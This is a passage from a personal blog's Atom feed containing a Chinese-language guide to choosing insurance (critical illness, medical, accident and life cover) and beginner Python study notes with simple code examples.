Example:</span><br><span class="line">    </span><br><span class="line">    &gt;&gt;&gt; abs(1)</span><br><span class="line">    1</span><br><span class="line">    &gt;&gt;&gt; abs(-1)</span><br><span class="line">    1</span><br><span class="line">    &gt;&gt;&gt; abs(0)</span><br><span class="line">    0</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    return n if n &gt;= 0 else (-n)</span><br></pre></td></tr></table></figure><p>Python内置的“文档测试”（doctest）模块可以直接提取注释中的代码并执行测试。</p><p>doctest严格按照Python交互式命令行的输入和输出来判断测试结果是否正确。只有测试异常的时候，可以用…表示中间一大段烦人的输出。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;错误处理&quot;&gt;&lt;a href=&quot;#错误处理&quot; class=&quot;headerlink&quot; title=&quot;错误处理&quot;&gt;&lt;/a&gt;错误处理&lt;/h2&gt;&lt;p&gt;Python通过&lt;code&gt;try...except...finally...&lt;/code&gt;的错误处理机制&lt;/p&gt;
&lt;p&gt;&lt;
      
    
    </summary>
    
      <category term="python" scheme="http://zhoushaw.github.io/categories/python/"/>
    
    
      <category term="python" scheme="http://zhoushaw.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>如何选购保险</title>
    <link href="http://zhoushaw.github.io/2019/09/17/other/life/%E4%BF%9D%E9%99%A9/"/>
    <id>http://zhoushaw.github.io/2019/09/17/other/life/保险/</id>
    <published>2019-09-17T03:39:35.000Z</published>
    <updated>2019-10-16T12:35:18.098Z</updated>
    
    <content type="html"><![CDATA[<div><a id="more"></a></div><p>##保险</p><ul><li>保险越早买越好，每次过生日保费会越来越贵</li></ul><h1 id="保险的分类"><a href="#保险的分类" class="headerlink" title="保险的分类"></a>保险的分类</h1><p><img src="https://s10.mogucdn.com/mlcdn/c45406/191016_2l7kjdk72icb8eg7353k24da98457_1300x731.jpg" alt=""></p><h2 id="医疗保险"><a href="#医疗保险" class="headerlink" title="医疗保险"></a>医疗保险</h2><p><img src="https://s10.mogucdn.com/mlcdn/c45406/191016_2hj6g09g26efdel4i629f5gedcc69_1300x731.jpg" alt=""></p><blockquote><p>重疾险和医疗保险</p></blockquote><p>重疾险就是比如确诊了，保额50万给患者，患者可能几年内不能工作，这笔钱治病、生活、还有收入的损失。</p><p>重疾险是给付型：是确诊就赔<br>医疗险是报销型：只报销医疗费用</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/191016_0dlb3jlk88079a14bc4e7f70ib35b_1300x731.jpg" alt=""></p><h2 id="意外险"><a href="#意外险" class="headerlink" title="意外险"></a>意外险</h2><ul><li>最低保额50万，最少5年收入的额度</li></ul><p><img src="https://s10.mogucdn.com/mlcdn/c45406/191016_5184j5gaf2ji10a978b08ig2aflj1_1300x731.jpg" alt=""></p><h2 id="寿险"><a href="#寿险" class="headerlink" title="寿险"></a>寿险</h2><p><img src="https://s10.mogucdn.com/mlcdn/c45406/191016_6blj2a3dhd34274f4ghh3j36d42dd_1300x731.jpg" alt=""></p><p>买寿险的考虑的最基础因素是：</p><ol><li>是否为家庭经济支柱</li><li>家庭是否有房贷负债等情况</li><li>是否需要抚养子女等</li></ol><p>其他：</p><ul><li>谁来买：给家庭经济支柱买</li><li>寿险保障到60岁退休以后就可以了</li><li>孩子不承担家庭经济任务，不需要买</li></ul><h2 id="重疾险"><a href="#重疾险" class="headerlink" title="重疾险"></a>重疾险</h2><blockquote><p>重疾险选购</p></blockquote><ul><li>是否包含轻症赔付很重要</li><li>小心多次赔付</li><li>保额充足很重要，至少30-50万起</li></ul><blockquote><p>多少保额够用呢</p></blockquote><p>根据现在医疗机构公布的数据，重大疾病至少需要三十万,而且重大疾病的康复周期是3-5年，最低保额=30万+3年年收入</p><blockquote><p>优先选择保障性，而不是返回型保险</p></blockquote><p>下图是保障型和返回型的价格对比，保障型有明显的价格优势</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/191016_70kj8hl154g2l75929c62aa3gdf47_1300x731.jpg" alt=""></p><blockquote><p>根据预算确定期限</p></blockquote><p>成人重疾险一般可以保障70-80岁或者终生，预算充足可以直接选择终生。</p><p>以35岁的成年保额50万举例的话终身重疾险险的保费大概是7000多元，如何预算是在有限可以保到70岁或者80岁。一个35岁的成年人保额50万保障到70岁，费用大概是4000多元</p><p>如果特别想要终身保障，预算略显不足的话，可以通过终身和定期重疾险的组合配置来实现，我们可以把保额做一定的分割，一部分保额买定期中级，另一部分买终身重疾</p><blockquote><p>购买重疾险注意</p></blockquote><p><img src="https://s10.mogucdn.com/mlcdn/c45406/191016_16cc5ccfed3hc37g7a050108d0ad2_1300x731.jpg" alt=""></p><blockquote><p>怎么选</p></blockquote><p>需要考虑：</p><ul><li>保障期限</li><li>疾病种类</li><li>赔付次数</li><li>健康告知</li></ul><h2 id="保险类型小结"><a href="#保险类型小结" class="headerlink" title="保险类型小结"></a>保险类型小结</h2><p><img src="https://s10.mogucdn.com/mlcdn/c45406/191016_8g7e16e30kcjla527h283dk086l18_1300x731.jpg" alt=""></p><h2 id="如何顺利理赔"><a href="#如何顺利理赔" class="headerlink" title="如何顺利理赔"></a>如何顺利理赔</h2><p>关键点：做好健康告知</p><p>原则：问啥答啥，不问不答，如实告知</p><h2 id="配置顺序"><a href="#配置顺序" class="headerlink" title="配置顺序"></a>配置顺序</h2><p><img src="https://s10.mogucdn.com/mlcdn/c45406/191016_4hf15ff9771l73gfbdjb9j862f54l_1300x731.jpg" alt=""></p><p>1.夫妻最优先配置<br>2.孩子<br>3.老人</p><p><strong>重疾险</strong>和<strong>寿险</strong>首选</p><p><strong>保额</strong>和<strong>保障期限</strong>是两个重要的因素之一</p><h2 id="孩子选什么保险"><a href="#孩子选什么保险" class="headerlink" title="孩子选什么保险"></a>孩子选什么保险</h2><p><img src="https://s10.mogucdn.com/mlcdn/c45406/191016_4lk3920d7fbfl2el9dk1b984hgbgf_1300x731.jpg" alt=""></p><ul><li>孩子是不需要寿险的</li><li>如果要选选择重疾险、医疗险、意外险</li><li>切记给孩子买了保险，父母没买足保险</li><li>先给孩子上医保</li><li>如果要选就选儿童专属重疾，保证到成年即可<ul><li>白血病</li><li>重症手足口等</li></ul></li><li>最长保到三十岁即可，保费可以便宜很多，而且保险日新月异，后面可以选择其他的保险</li></ul><h2 id="老人选什么"><a href="#老人选什么" class="headerlink" title="老人选什么"></a>老人选什么</h2><p>老人年龄大保费贵、老人一般都会有健康问题</p><ul><li>老人优选防癌险，防癌险相对重疾更加便宜，癌症最高发</li><li>防癌险不会对种类进行要求，都会赔付</li><li>父母年龄越大，疾病发生，他们非常需要保险</li><li>在买保险前先咨询专业的人士，这样在赔付时才不会出现理赔纠纷</li></ul><h2 id="如何配置家庭保险"><a href="#如何配置家庭保险" class="headerlink" title="如何配置家庭保险"></a>如何配置家庭保险</h2><blockquote><p>高房贷，家庭收入集中在个人身上</p></blockquote><p>家庭主要经济来源需要配置高额度寿险，可以保障到60岁退休</p><blockquote><p>买保险，充分分析自己的情况和需求进行选择</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>理财和保障分开做，不要买理财保险</li><li>优先给家庭经济支柱配置保险</li><li>考虑到性价比，不要给孩子买捆绑了寿险的重疾险</li><li>预算在有限，都不能妥协保障额度</li><li>不能人云亦云，要给予自己家庭情况进行配置规划</li></ul><p><img src="https://s10.mogucdn.com/mlcdn/c45406/191016_565a6b9al38542j3a4i4h396e7idb_1300x731.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;div&gt;
    
    </summary>
    
      <category term="life" scheme="http://zhoushaw.github.io/categories/life/"/>
    
    
      <category term="life" scheme="http://zhoushaw.github.io/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>python知识</title>
    <link href="http://zhoushaw.github.io/2019/09/11/learning/python/python-basics/"/>
    <id>http://zhoushaw.github.io/2019/09/11/learning/python/python-basics/</id>
    <published>2019-09-11T05:14:00.000Z</published>
    <updated>2019-10-16T12:35:18.081Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>本文是Python的笔记，<a href="https://www.liaoxuefeng.com/wiki/1016959663602400" target="_blank" rel="noopener">教程文档</a></p><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = input(&apos;please enter your name: &apos;)</span><br><span class="line">print(&apos;hello,&apos;, name)</span><br></pre></td></tr></table></figure><p>命令行展示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Workspace&gt; python hello.py</span><br><span class="line">please enter your name: Michael</span><br><span class="line">hello, Michael</span><br></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul><li>整型</li><li>浮点型</li><li>字符串</li><li>布尔值</li><li>空值</li></ul><p><code>int()</code>函数可以将字符类型的数字转成int型</p><blockquote><p>字符串</p></blockquote><p><code>某些特殊字符进行“转义”，Python 字符串用 \ 进行转义</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\n 表示换行</span><br><span class="line">\t 表示一个制表符</span><br><span class="line">\\ 表示 \ 字符本身</span><br></pre></td></tr></table></figure><ul><li>对特殊字符串进行转义，使用\，对多个特殊字符进行转换是使用r’特殊字符’</li><li>多行’’’…..’’’,类似js<code></code>模板字符串</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(&apos;&apos;&apos;line1</span><br><span class="line">... line2</span><br><span class="line">... line3&apos;&apos;&apos;)</span><br><span class="line">line1</span><br><span class="line">line2</span><br><span class="line">line3</span><br></pre></td></tr></table></figure><p><strong>读取中文</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br></pre></td></tr></table></figure><p>由于 Python 源代码也是一个文本文件，所以，当你的源代码中包含中文的时候，在保存源代码时，就需要务必指定保存为 UTF-8 编码。当Python 解释器读取源代码时，为了让它按 UTF-8 编码读取</p><blockquote><p>布尔型</p></blockquote><ul><li>布尔值可以用 and、or 和 not 运算。</li><li>and 运算是与运算，只有所有都为 True，and 运算结果才是 True。</li><li>or 运算是或运算，只要其中有一个为 True，or 运算结果就是 True。</li><li>not 运算是非运算，它是一个单目运算符，把 True 变成 False，False 变成 True。</li></ul><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>ASCII：不包含中文<br>Unicode：国际标准编码<br>UTF-8：对Unicode进行了优化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br></pre></td></tr></table></figure><ul><li>第一行注释是为了告诉Linux/OS X系统，这是一个Python可执行程序，Windows系统会忽略这个注释；</li><li>第二行注释是为了告诉Python解释器，按照UTF-8编码读取源代码，否则，你在源代码中写的中文输出可能会有乱码。</li></ul><h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;Hello, %s&apos; % &apos;world&apos;</span><br><span class="line">&apos;Hello, world&apos;</span><br><span class="line">&apos;Hi, %s, you have $%d.&apos; % (&apos;Michael&apos;, 1000000)</span><br><span class="line">&apos;Hi, Michael, you have $1000000.&apos;</span><br></pre></td></tr></table></figure><table><thead><tr><th>占位符</th><th>替换内容</th></tr></thead><tbody><tr><td>%d</td><td>整数</td></tr><tr><td>%f</td><td>浮点数</td></tr><tr><td>%s</td><td>字符串</td></tr><tr><td>%x</td><td>十六进制整数</td></tr></tbody></table><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>Python内置的一种数据类型是列表：list。list是一种有序的集合，可以随时添加和删除其中的元素。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">classmates = [&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]</span><br><span class="line">classmates</span><br><span class="line">[&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]</span><br></pre></td></tr></table></figure><ul><li>获取数组长度:<code>len(classmates)</code></li><li>通过索引下标获取值: <code>classmates[0]</code><ul><li>输出：<code>&#39;Michael&#39;</code></li></ul></li><li>指定位置插入：<code>classmates.insert(1, &#39;Jack&#39;)</code></li><li>在最后插入：<code>classmates.append(&#39;Adam&#39;)</code></li><li>在最后删除：<code>classmates.pop()</code></li><li>删除指定位置 <code>classmates.pop(1)</code></li><li>取list区间值：<code>L[star:end]</code>，取0到3之间的元素不包含end<ul><li>索引为0时可以省略<code>L[:3]</code>取前三个</li><li>可以用-数序号，倒数第一个元素的索引是-1，取后十个: <code>L[-10:]</code></li><li>前10个数，每两个取一个: <code>L[:10:2]</code></li><li>字符串也可以与list类似的取值方式</li></ul></li><li>数组反转<ul><li>reverse，<code>list.reverse()</code></li><li>切片反转<code>list[::-1]</code></li></ul></li></ul><h4 id="列表生成器"><a href="#列表生成器" class="headerlink" title="列表生成器"></a>列表生成器</h4><blockquote><p>生成list</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list(range(1, 11))</span><br><span class="line">[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span><br></pre></td></tr></table></figure><blockquote><p>迭代元素基础上增加</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[x * x for x in range(1, 11)]</span><br><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span><br></pre></td></tr></table></figure><blockquote><p>迭代元素筛选，仅留下偶数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[x * x for x in range(1, 11) if x % 2 == 0]</span><br><span class="line">[4, 16, 36, 64, 100]</span><br></pre></td></tr></table></figure><blockquote><p>两层循环</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[m + n for m in &apos;ABC&apos; for n in &apos;XYZ&apos;]</span><br><span class="line">#[&apos;AX&apos;, &apos;AY&apos;, &apos;AZ&apos;, &apos;BX&apos;, &apos;BY&apos;, &apos;BZ&apos;, &apos;CX&apos;, &apos;CY&apos;, &apos;CZ&apos;]</span><br></pre></td></tr></table></figure><h4 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h4><ul><li>将迭代器的<code>[]</code>更改成<code>()</code>生成的将会是迭代器，迭代器保存的数据的规则</li><li>生成器对象可以通过<code>next()</code>函数调用</li><li>生成器也可以通过<code>for in</code>迭代</li></ul><h3 id="tuple-元组"><a href="#tuple-元组" class="headerlink" title="tuple(元组)"></a>tuple(元组)</h3><p>tuple与list类似，都是但是tuple初始化完成后，不可添加删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classmates = (&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;)</span><br></pre></td></tr></table></figure><p>也可以通过下标<code>0</code>、<code>1</code>访问tuple内的元素</p><p>定义一个元组时,需要增加<code>,</code>号，因为()一般也用于计算，为了区分所以要增加<code>,</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = (&apos;few&apos;,)</span><br></pre></td></tr></table></figure><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">age = 3</span><br><span class="line">if age &gt;= 18:</span><br><span class="line">    print(&apos;adult&apos;)</span><br><span class="line">elif age &gt;= 6:</span><br><span class="line">    print(&apos;teenager&apos;)</span><br><span class="line">else:</span><br><span class="line">    print(&apos;kid&apos;)</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if &lt;条件判断1&gt;:</span><br><span class="line">    &lt;执行1&gt;</span><br><span class="line">elif &lt;条件判断2&gt;:</span><br><span class="line">    &lt;执行2&gt;</span><br><span class="line">elif &lt;条件判断3&gt;:</span><br><span class="line">    &lt;执行3&gt;</span><br><span class="line">else:</span><br><span class="line">    &lt;执行4&gt;</span><br></pre></td></tr></table></figure><p>if判断条件还可以简写，比如写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if x:</span><br><span class="line">    print(&apos;True&apos;)</span><br></pre></td></tr></table></figure><p>只要x是非零数值、非空字符串、非空list等，就判断为True，否则为False</p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><blockquote><p>循环数组</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names = [&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]</span><br><span class="line">for name in names:</span><br><span class="line">    print(name)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Michael</span><br><span class="line">Bob</span><br><span class="line">Tracy</span><br></pre></td></tr></table></figure><p>for in 就是按顺序迭代</p><p><code>range()</code>函数可以生成一个整数序列，再通过list()函数可以转换为list</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list(range(5))</span><br><span class="line">[0, 1, 2, 3, 4]</span><br></pre></td></tr></table></figure><blockquote><p>while循环</p></blockquote><p>输出1+2+…+10结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sum = 0</span><br><span class="line">n = 10</span><br><span class="line">while n &gt; 0:</span><br><span class="line">    sum = sum + n</span><br><span class="line">    n = n - 1</span><br><span class="line">print(sum)</span><br></pre></td></tr></table></figure><p>提前终止</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sum = 0</span><br><span class="line">n = 10</span><br><span class="line">while n &gt; 0:</span><br><span class="line">    if n&lt;5:</span><br><span class="line">        break</span><br><span class="line">    sum = sum + n</span><br><span class="line">    n = n - 1</span><br><span class="line">print(sum)</span><br></pre></td></tr></table></figure><p>continue，跳过当前循环，执行下一循环，例：不加偶数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sum = 0</span><br><span class="line">n = 10</span><br><span class="line">while n &gt; 0:</span><br><span class="line">    n = n - 1</span><br><span class="line">    if n%2==0:</span><br><span class="line">        continue</span><br><span class="line">    sum = sum + n</span><br><span class="line">print(sum)</span><br></pre></td></tr></table></figure><h2 id="字典dict"><a href="#字典dict" class="headerlink" title="字典dict"></a>字典dict</h2><p>dict全称dictionary，在其他语言中也称为map，使用键-值（key-value）存储</p><p>dict的key必须是不可以变的所以，key不可以是list或另一个dict，字符、整数这些就是不可变的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;&apos;Michael&apos;: 95, &apos;Bob&apos;: 75, &apos;Tracy&apos;: 85&#125;</span><br><span class="line">d[&apos;Michael&apos;]</span><br><span class="line">95</span><br></pre></td></tr></table></figure><ul><li>添加新key-value<code>d[&#39;Adam&#39;] = 67</code></li><li>获取不存在的key会报错<code>d[&#39;shaw&#39;]</code></li><li>通过in判断key是否存在<code>&#39;Thomas&#39; in d</code></li><li><code>get()</code>方法判断是否存在<ul><li>如果key不存在，返回None</li><li><code>d.get(&#39;shaw&#39;,-1)</code>，不存在指定返回-1</li></ul></li><li>删除指定key<code>d.pop(&#39;Bob&#39;)</code></li><li>迭代<code>dict</code>的<code>key</code>和<code>value</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;&apos;x&apos;: &apos;A&apos;, &apos;y&apos;: &apos;B&apos;, &apos;z&apos;: &apos;C&apos; &#125;</span><br><span class="line">for k, v in d.items():</span><br><span class="line">...     print(k, &apos;=&apos;, v)</span><br></pre></td></tr></table></figure><h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>set和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key</p><p>要创建一个set，需要提供一个list作为输入集合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = set([1, 2, 3])</span><br><span class="line">s</span><br><span class="line">#&#123;1, 2, 3&#125;</span><br></pre></td></tr></table></figure><ul><li>重复的将自动过滤掉</li><li>通过<code>add(key)</code>方法可以添加元素到set中<code>s.add(4)</code></li><li>通过<code>remove(key)</code>方法可以删除元素,s.remove(4)</li></ul><blockquote><p>set可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集等操作：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s1 = set([1, 2, 3])</span><br><span class="line">s2 = set([2, 3, 4])</span><br><span class="line">s1 &amp; s2</span><br><span class="line">&#123;2, 3&#125;</span><br><span class="line">s1 | s2</span><br><span class="line">&#123;1, 2, 3, 4&#125;</span><br></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>通过<code>help(abs)</code>查看<code>abs</code>函数的帮助信息</p><ul><li><code>abs</code>: 求绝对值的函数</li><li><code>max</code>: 比较数据</li><li><code>int</code>: 可以把其他数据类型转换为整数</li><li><code>float</code>: 转成浮点数</li><li><code>str</code>: 转成字符型</li><li><code>bool</code>: 转成boolean类型</li><li><code>hex</code>: 转成十六进制</li></ul><p>通过<code>lambda</code>来定义匿名函数<br>匿名函数<code>lambda x: x * x</code>实际上就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def f(x):</span><br><span class="line">    return x * x</span><br></pre></td></tr></table></figure><h2 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h2><ul><li>通过<code>def</code>关键词来声明函数</li><li>括号内的<code>x</code>是相应的参数</li><li>没有定义return值，默认返回<code>None</code></li><li>返回的多个值，将会变成tuple</li><li><code>python</code>中函数与变量之间也存在闭包，返回函数通过对外层函数变量的引用也会导致变量闭包，与JavaScript中的闭包非常类似，不过里层变量在使用外层作用域变量时需要使用<code>nonlocal</code>对变量进行申明</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def my_abs(x):</span><br><span class="line">    if x &gt;= 0:</span><br><span class="line">        return x</span><br><span class="line">    else:</span><br><span class="line">        return -x</span><br></pre></td></tr></table></figure><blockquote><p>定义空函数</p></blockquote><p>使用<code>pass</code>语句，若函数、条件判断不使用pass关键词又为空的会将会报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def nop():</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><h2 id="函数的参数"><a href="#函数的参数" class="headerlink" title="函数的参数"></a>函数的参数</h2><ul><li>默认情况下不校验参数类型，内置函数会校验参数类型</li><li>会校验参数个数</li><li>可以给参数定义默认值<ul><li>必选参数在前，默认参数在后</li><li>提供了默认参数，在调用函数时默认参数不传</li><li>默认参数必须指向不变对象！(可变对象对此调用函数后将会导致值更改值被缓存下来了)</li></ul></li></ul><blockquote><p>可变参数，参数传入的数量可以是不定的，通过<code>*</code>关键词可以将传入的参数变成元组,可以不传参</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def calc(*numbers):</span><br><span class="line">    print(numbers)</span><br><span class="line">calc(1,2,3,4)</span><br><span class="line"># 运行输出</span><br><span class="line">calc(1,2,3,4)</span><br><span class="line">(1,2,3,4)</span><br><span class="line"></span><br><span class="line"># calc(*numbers) === calc((1,2,3,4))</span><br></pre></td></tr></table></figure><blockquote><p>可以将list或tuple的元素变成可变参数传进去，相当于数组解构展开</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nums = [1, 2, 3]</span><br><span class="line">calc(*nums)</span><br><span class="line">(1,2,3)</span><br><span class="line"></span><br><span class="line"># calc(*nums) === calc(1,2,3)</span><br></pre></td></tr></table></figure><blockquote><p>关键字参数允许你传入0个或任意个含参数名的参数，这些关键字参数在函数内部自动组装为一个dict</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def person(name, age, **kw):</span><br><span class="line">    print(&apos;name:&apos;, name, &apos;age:&apos;, age, &apos;other:&apos;, kw)</span><br><span class="line">person(&apos;Bob&apos;, 35, city=&apos;Beijing&apos;,job=&apos;Engineer&apos;)</span><br><span class="line">(&apos;name:&apos;, &apos;Bob&apos;, &apos;age:&apos;, 35, &apos;other:&apos;, &#123;&apos;city&apos;: &apos;Beijing&apos;, &apos;job&apos;: &apos;Engineer&apos;&#125;)</span><br></pre></td></tr></table></figure><p>简化的写法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extra = &#123;&apos;city&apos;: &apos;Beijing&apos;, &apos;job&apos;: &apos;Engineer&apos;&#125;</span><br><span class="line">person(&apos;Jack&apos;, 24, **extra)</span><br><span class="line">name: Jack age: 24 other: &#123;&apos;city&apos;: &apos;Beijing&apos;, &apos;job&apos;: &apos;Engineer&apos;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>命名关键字参数必须传入参数名</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def person(name, age, *, city=&apos;Beijing&apos;, job):</span><br><span class="line">    print(name, age, city, job)</span><br><span class="line">person(&apos;Jack&apos;, 24, job=&apos;Engineer&apos;)</span><br><span class="line">Jack 24 Beijing Engineer</span><br></pre></td></tr></table></figure><h3 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h3><blockquote><p>map</p></blockquote><ul><li><code>map</code>接收两个参数，第一个是<code>Iterable</code>的函数，第二个是需要迭代的list、或set数据<ul><li><code>Iterable</code>迭代的参数将会接收到两个参数：第一个参数是前一个，第二个参数是后一个</li><li>map返回的是一个新的list</li></ul></li><li>list所有元素*10</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def f(x):</span><br><span class="line">    return x * x</span><br><span class="line">r = map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])</span><br><span 